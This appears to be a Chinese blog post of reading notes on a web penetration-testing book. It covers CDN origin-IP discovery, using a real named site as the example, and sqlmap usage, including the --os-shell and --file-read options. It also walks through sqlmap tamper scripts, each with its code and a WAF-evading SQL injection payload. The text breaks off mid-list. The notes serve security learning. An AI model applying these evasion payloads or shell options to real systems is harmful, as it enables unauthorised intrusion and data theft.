class="toc-text">commalessmid.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#commentbeforeparentheses-py："><span class="toc-text">commentbeforeparentheses.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#concat2concatws-py："><span class="toc-text">concat2concatws.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#equaltolike-py："><span class="toc-text">equaltolike.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#escapequotes-py："><span class="toc-text">escapequotes.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#greatest-py："><span class="toc-text">greatest.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#halfversionedmorekeywords-py："><span class="toc-text">halfversionedmorekeywords.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htmlencode-py："><span class="toc-text">htmlencode.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ifnull2ifisnull-py："><span class="toc-text">ifnull2ifisnull.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#informationschemacomment-py："><span class="toc-text">informationschemacomment.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lowercase-py："><span class="toc-text">lowercase.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#modsecurityversioned-py："><span class="toc-text">modsecurityversioned.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#modsecurityzeroversioned-py："><span class="toc-text">modsecurityzeroversioned.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#multiplespaces-py："><span class="toc-text">multiplespaces.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nonrecursivereplacement-py："><span class="toc-text">nonrecursivereplacement.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#overlongutf8-py："><span class="toc-text">overlongutf8.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#percentage-py："><span class="toc-text">percentage.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#plus2concat-py："><span class="toc-text">plus2concat.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#plus2fnconcat-py："><span class="toc-text">plus2fnconcat.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#randomcase-py："><span class="toc-text">randomcase.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#randomcomments-py："><span class="toc-text">randomcomments.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#securesphere-py："><span class="toc-text">securesphere.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sp-password-py："><span class="toc-text">sp_password.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2comment-py："><span class="toc-text">space2comment.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2dash-py："><span class="toc-text">space2dash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2hash-py："><span class="toc-text">space2hash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2morecomment-py："><span class="toc-text">space2morecomment.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2morehash-py："><span class="toc-text">space2morehash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mssqlblank-py："><span class="toc-text">space2mssqlblank.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mssqlhash-py："><span class="toc-text">space2mssqlhash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mysqlblank-py："><span class="toc-text">space2mysqlblank.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2mysqldash-py："><span class="toc-text">space2mysqldash.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2plus-py："><span class="toc-text">space2plus.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#space2randomblank-py："><span class="toc-text">space2randomblank.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#symboliclogical-py："><span class="toc-text">symboliclogical.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unionalltounion-py："><span class="toc-text">unionalltounion.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unmagicquotes-py："><span class="toc-text">unmagicquotes.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uppercase-py："><span class="toc-text">uppercase.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#varnish-py："><span class="toc-text">varnish.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#versionedkeywords-py"><span class="toc-text">versionedkeywords.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#versionedmorekeywords-py："><span class="toc-text">versionedmorekeywords.py：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xforwardedfor-py："><span class="toc-text">xforwardedfor.py：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第4章-Web安全原理剖析"><span class="toc-text">第4章 Web安全原理剖析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#"><span class="toc-text"> </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql注入中tips"><span class="toc-text">sql注入中tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64注入"><span class="toc-text">base64注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XFF注入"><span class="toc-text">XFF注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过waf"><span class="toc-text">绕过waf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#大小写绕过"><span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#双写绕过"><span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编码绕过"><span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内联注释"><span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql防御"><span class="toc-text">sql防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss"><span class="toc-text">xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#文件后缀绕过"><span class="toc-text">文件后缀绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-解析漏洞"><span class="toc-text">Apache 解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件截断绕过"><span class="toc-text">文件截断绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务端检测绕过-文件类型MIME-类型检测"><span class="toc-text">服务端检测绕过(文件类型MIME 类型检测)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务端验证绕过-文件完整性检测"><span class="toc-text">服务端验证绕过(文件完整性检测)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务端检测绕过-文件扩展名检测"><span class="toc-text">服务端检测绕过(文件扩展名检测)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务端检测绕过-文件内容检测"><span class="toc-text">服务端检测绕过(文件内容检测)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务器解析漏洞"><span class="toc-text">服务器解析漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Apache-解析漏洞-1"><span class="toc-text">Apache 解析漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IIS-解析漏洞"><span class="toc-text">IIS 解析漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#IIS5-x-6-0解析漏洞"><span class="toc-text">IIS5.x/6.0解析漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Nginx-解析漏洞"><span class="toc-text">Nginx 解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#竞争条件攻击"><span class="toc-text">竞争条件攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#逻辑漏洞"><span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#未授权访问"><span class="toc-text">未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#越权访问"><span class="toc-text">越权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#垂直越权"><span class="toc-text">垂直越权</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#水平越权"><span class="toc-text">水平越权</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第5章-Metasploit技术"><span class="toc-text">第5章 Metasploit技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#模块"><span class="toc-text">模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见命令"><span class="toc-text">常见命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主机扫描"><span class="toc-text">主机扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-进程迁移"><span class="toc-text">0x00 进程迁移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-系统命令"><span class="toc-text">0x01 系统命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#网络摄像头摄像头命令"><span class="toc-text">网络摄像头摄像头命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件系统命令"><span class="toc-text">文件系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1）getsystem提权"><span class="toc-text">1）getsystem提权</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#令牌窃取"><span class="toc-text">令牌窃取</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#获取哈希"><span class="toc-text">获取哈希</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2）bypassuac"><span class="toc-text">2）bypassuac</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-后门"><span class="toc-text">0x03 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#后门工具Cymothoa"><span class="toc-text">后门工具Cymothoa</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#persistence"><span class="toc-text">persistence</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-内网域渗透"><span class="toc-text">0x04 内网域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#提升权限"><span class="toc-text">提升权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#信息收集"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ipc-入侵实战"><span class="toc-text">ipc$入侵实战</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell寻找域管在线服务器"><span class="toc-text">powershell寻找域管在线服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取域管权限"><span class="toc-text">获取域管权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#登录域控制"><span class="toc-text">登录域控制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#smb爆破内网"><span class="toc-text">smb爆破内网</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-清理日志"><span class="toc-text">0x05 清理日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-text"> </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第6章-PowerShell攻击指南"><span class="toc-text">第6章 PowerShell攻击指南</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Powershell基础"><span class="toc-text">Powershell基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#执行策略"><span class="toc-text">执行策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#运行脚本"><span class="toc-text">运行脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常用命令"><span class="toc-text">常用命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powersploit"><span class="toc-text">Powersploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#一-执行shellcode反弹meterpreter-shell"><span class="toc-text">一.执行shellcode反弹meterpreter shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#绕过杀软执行-invoke-Mimikatz"><span class="toc-text">绕过杀软执行 invoke-Mimikatz</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Powerup"><span class="toc-text">Powerup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Empire"><span class="toc-text">Empire</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文首发于<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=45429&amp;highlight=%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0" target="_blank" rel="external">i春秋</a>，转载请注明来源</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录书中一些不甚熟悉以及其他扩展的技巧tips，欢迎纠错和交流。</p>
+<h2 id="第1章-渗透测试之信息收集"><a href="#第1章-渗透测试之信息收集" class="headerlink" title="第1章 渗透测试之信息收集"></a><strong>第1章 渗透测试之信息收集</strong></h2><p>进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能地收集目标的信息。所谓“知己知彼，百战不殆”，我们越是了解测试目标，测试的工作就越是容易。本章主要介绍了域名及子域名信息收集﹑查找真实IP﹑CMS指纹识别﹑目标网站真实IP﹑常用端口的信息收集等。</p>
+<h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>nslookup</p>
+<p>whois</p>
+<p>天眼查</p>
+<h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><p>谷歌语法</p>
+<p>看burpsuite的response包</p>
+<h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p><a href="https://dnsdumpster.com/、在线dns侦查、" target="_blank" rel="external">https://dnsdumpster.com/、在线dns侦查、</a></p>
+<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>工具：御剑web指纹识别，what web，webrobo，椰树，轻量web指纹识别，</p>
+<p>在线网站：<a href="http://tools.bugscaner.com/" target="_blank" rel="external">Bugscaner</a>、<a href="http://www.yunsee.cn/" target="_blank" rel="external">云悉指纹</a>、<a href="https://www.whatweb.net/" target="_blank" rel="external">whatweb</a></p>
+<h3 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h3><p>不存在cdn：<a href="http://www.ip138.com/" target="_blank" rel="external">http://www.ip138.com/</a></p>
+<p>cdn：先用<a href="https://www.17ce.com/多地区ping" target="_blank" rel="external">https://www.17ce.com/多地区ping</a></p>
+<p>绕过方式：</p>
+<ul>
+<li><p>内部邮箱源，ping邮件服务器的域名</p>
+</li>
+<li><p>扫描测试文件 phpinfo</p>
+</li>
+<li><p>分站域名： 主站挂cdn，分站未挂，二级域名突破口</p>
+</li>
+<li><p>国外访问：国内的cdn只针对国内用户访问加速，国外不一定 通过国外在线代理网站：<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="external">https://asm.ca.com/en/ping.php</a></p>
+</li>
+<li><p>查询域名解析记录。<a href="https://www.netcraft.com/" target="_blank" rel="external">https://www.netcraft.com/</a></p>
+</li>
+<li><p>网站有app，burpsuit抓包</p>
+</li>
+<li><p>绕过CloudFlare CDN查找真实IP。CloudFlare Watch</p>
+</li>
+<li><p>用 Zmap 扫全网</p>
+<p>  『我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me』（其中xiaix.me是需要寻找真实IP的域名）。说到这个，我就想起了shodan，zoomeye。虽然他们都很强大地能够搜索到全球的IP banner信息，http的banner信息，但是却不能搜索网页代码。</p>
+<p>  有没有一种搜索可以搜索网页标题、内容的方法，这样，我就能找到哪写服务器上运行的网站是与我要找的一致，就能找出真实的服务器IP。在圈子里混，朋友推荐一个新的IOT搜索引擎，跟前面提到的两个相似，叫fofa，WWW.FOFA.SO。这个东西优点是支持HTML源代码检索。</p>
+<p>  举例：找到www.5173.com的真实IP</p>
+<p>  使用ping命令，返回信息有『49k6959vz6ea10u8.alicloudsec.com (218.11.3.155)』，这及时试用了某CDN服务的信号。</p>
+<blockquote>
+<p><strong>ping www.5173.com</strong><br>正在 Ping 49k6959vz6ea10u8.alicloudsec.com [218.11.3.155] 具有 32 字节的数据:<br>来自 218.11.3.155 的回复: 字节=32 时间=34ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=36ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=32ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=31ms TTL=33</p>
+<p>218.11.3.155 的 Ping 统计信息:</p>
+<pre><code>数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，
+</code></pre><p>往返行程的估计时间(以毫秒为单位):</p>
+<pre><code>最短 = 31ms，最长 = 36ms，平均 = 33ms
+</code></pre></blockquote>
+<p>  访问www.5173.com，源代码内显示标题有很特别的内容『网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com』，包含有根域名5173.com，这种title是非常特殊的，用来检索，就能找到WWW.5173.COM的真实IP</p>
+<p>  查看www.5173.com的标题</p>
+<p>  将这个标题内容作为关键词搜索，使用语法『title=”网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com”』</p>
+<p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252056_937.png" alt=""></p>
+<p>  在FOFA上搜索到3个网站包含指定标题</p>
+<p>  在FOFA上搜索到www.5173.com的IP</p>
+<p>  最后，访问<a href="http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155" target="_blank" rel="external">http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155</a>“</p>
+<p>  搜索这个IP上的全部服务和网站，显示全是5173.com结尾的域名，基本确认这是真实ip，且是5173.com的主要网站服务器。</p>
+<p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252101_958.png" alt=""></p>
+<p>  查看『218.11.3.155』上的所有网站和服务</p>
+</li>
+</ul>
+<h3 id="收集敏感目录"><a href="#收集敏感目录" class="headerlink" title="收集敏感目录"></a>收集敏感目录</h3><p>spinder.py、<a href="http://www.webscan.cc/、dirbuster" target="_blank" rel="external">http://www.webscan.cc/、dirbuster</a></p>
+<h2 id="第2章-搭建漏洞环境及实战"><a href="#第2章-搭建漏洞环境及实战" class="headerlink" title="第2章 搭建漏洞环境及实战"></a><strong>第2章 搭建漏洞环境及实战</strong></h2><p>白帽子在目标对象不知情或者没有得到授权的情况下发起的渗透攻击是非法行为，所以我们通常会搭建一个有漏洞的Web应用程序，以此来练习各种各样的安全渗透技术。本章主要介绍了Linux系统下的LANMP﹑Windows系统下的WAMP应用环境的搭建，DVWA漏洞平台﹑SQL注入平台﹑XSS测试平台等常用渗透测试漏洞练习平台的安装配置及实战。</p>
+<h2 id="第3章-常用工具"><a href="#第3章-常用工具" class="headerlink" title="第3章 常用工具"></a><strong>第3章 常用工具</strong></h2><p>“工欲善其事，必先利其器”，在日常的渗透测试中，借助一些工具，白帽子可以更高效地执行安全测试，这能极大地提高工作的效率和成功率。本章详细介绍了黑客常用的三大神器SQLMap﹑Burp Suite﹑Nmap的安装﹑入门和实战利用，实为“居家旅行”﹑渗透测试之必备工具。</p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>–os-shell –os-shell 运行任意系统操作命令</p>
+<p>sqlmap -u “url” –file-read “C:/example.exe” -v 1 从数据可服务器中读取文件</p>
+<p>–file-write –file-dest :上传文件到数据服务器中</p>
+<p>–identify -waf 是否有安全防护 （waf/IDS/IPS）</p>
+<p>sqlmap tamper：</p>
+<h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><blockquote>
+<p>sqlmap.py XXXXX -tamper “模块名”</p>
+</blockquote>
+<h3 id="各个-tamper-的作用"><a href="#各个-tamper-的作用" class="headerlink" title="各个 tamper 的作用"></a>各个 tamper 的作用</h3><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p>
+<h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><blockquote>
+<p>return payload.replace(‘\’’, “%EF%BC%87”) if payload else payload</p>
+</blockquote>
+<p>apostrophemask.py 用UTF-8全角字符替换单引号字符 ，用于过滤了单引号的情况。</p>
+<blockquote>
+<p>1’ AND ‘1’=’1  <strong>to</strong>     1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><blockquote>
+<p>return payload.replace(‘\’’, “%00%27”) if payload else payload</p>
+</blockquote>
+<p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p>
+<blockquote>
+<p>1’ AND ‘1’=’1     <strong>to</strong>     1�’ AND �’1�’=�’1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><blockquote>
+<p>return “%s%%00” % payload if payload else payload</p>
+</blockquote>
+<p>在你构造的payload后面加一个空字符</p>
+<blockquote>
+<p>1’ AND ‘1’=’1    <strong>to</strong>    1’ AND ‘1’=’1[]</p>
+</blockquote>
+<p><strong>适用数据库：</strong>Access</p>
+<h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><blockquote>
+<p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p>
+</blockquote>
+<p>这个看模块名也知道是 base64 编码</p>
+<blockquote>
+<p>1’ AND ‘1’=’1     <strong>to</strong>    MScgQU5EICcxJz0nMQ==</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：<code>C:\Python\SQLMap\tamper\between.py</code></p>
+<p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p>
+<blockquote>
+<p>1 AND A &gt; B    <strong>to</strong>    1 AND A NOT BETWEEN 0 AND B</p>
+<p>1 AND A = B    <strong>to</strong>    1 AND A BETWEEN B AND B</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p>
+<blockquote>
+<p>union select <em> from users where id = 1    <strong>to</strong>    union%09select </em> from%09users where id like 1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p>
+<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用 url 编码两次你的 payload </p>
+<blockquote>
+<p>select <em> from users    <em>*to</em></em>    %2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用 url 编码一次你的 payload</p>
+<blockquote>
+<p>select <em> from users    <em>*to</em></em>    %73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用 unicode 编码 payload ，只编码非编码字符</p>
+<blockquote>
+<p>select <em> from users    <em>*to</em></em>    \u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p>
+<h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p>
+<blockquote>
+<p>limit 2,1    <strong>to</strong>    limit 1 offset 2</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p>
+<blockquote>
+<p>mid(version(), 1, 1)    <strong>to</strong>    mid(version() from 1 for 1)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><blockquote>
+<p>retVal = re.sub(r”\b(\w+)(“, “\g<1>/**/(“, retVal)</1></p>
+</blockquote>
+<p>在某个单词后的第一个括号前面加入 /**/ ，用于过滤了函数的情况</p>
+<blockquote>
+<p>union select group_concat(table_name)    <strong>to</strong>    union select group_concat/**/(table_name)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="concat2concatws-py："><a href="#concat2concatws-py：" class="headerlink" title="concat2concatws.py："></a>concat2concatws.py：</h4><blockquote>
+<p>payload = payload.replace(“CONCAT(“, “CONCAT_WS(MID(CHAR(0),0,0),”)</p>
+</blockquote>
+<p>用于过滤了 concat 函数的情况</p>
+<blockquote>
+<p>concat(1,2)    <strong>to</strong>    concat_ws(mid(char(0), 0, 0), 1, 2)</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL</p>
+<h4 id="equaltolike-py："><a href="#equaltolike-py：" class="headerlink" title="equaltolike.py："></a>equaltolike.py：</h4><blockquote>
+<p>retVal = re.sub(r”\s<em>=\s</em>“, “ LIKE “, retVal)</p>
+</blockquote>
+<p>将等号用 like 代替，用于过滤了等号的情况</p>
+<blockquote>
+<p>select <em> from users where id=1    <strong>to</strong>    select </em> from users where id like 1</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="escapequotes-py："><a href="#escapequotes-py：" class="headerlink" title="escapequotes.py："></a>escapequotes.py：</h4><blockquote>
+<p>return payload.replace(“‘“, “\’”).replace(‘“‘, ‘\”‘)</p>
+</blockquote>
+<p>将单引号转换成 \‘ ，双引号转换成 \“ ，用于过滤了单引号或双引号的情况</p>
+<blockquote>
+<p>1’ and 1=1–+    <strong>to</strong>    1\‘ and 1=1–+</p>
+</blockquote>
+<p><strong>适用数据库：</strong>ALL</p>
+<h4 id="greatest-py："><a href="#greatest-py：" class="headerlink" title="greatest.py："></a>greatest.py：</h4><p>用 greatest 代替大于符号，用于大于符号被过滤了的情况</p>
+<blockquote>
+<p>1 and a&gt;b    <strong>to</strong>    1 and greatest(a,b+1)=a</p>
+</blockquote>
+<p>ALL</p>
+<h4 id="halfversionedmorekeywords-py："><a href="#halfversionedmorekeywords-py：" class="headerlink" title="halfversionedmorekeywords.py："></a>halfversionedmorekeywords.py：</h4><p>在关键字前添加注释，用于过滤了关键字的情况</p>
+<blockquote>
+<p>union select 1,2    <strong>to</strong>    /<em>!0union/</em>!0select 1,2</p>
+</blockquote>
+<p><strong>适用数据库：</strong>MySQL &lt; 5.1</p>
+<h4 id="htmlencode-py："><a href="#htmlencode-py：" class="headerlink" title="htmlencode.py："></a>htmlencode.py：</h4><blockquote>
+<p>return re.sub(r”[^\w]”, lambda match: “&amp;#%d;” % ord(match.group(0)), payload) if payload else payload</p>
+</blockquote>
+<p>从名字就知道是将 payload 进行 html 编码</p>
+<blockquote>
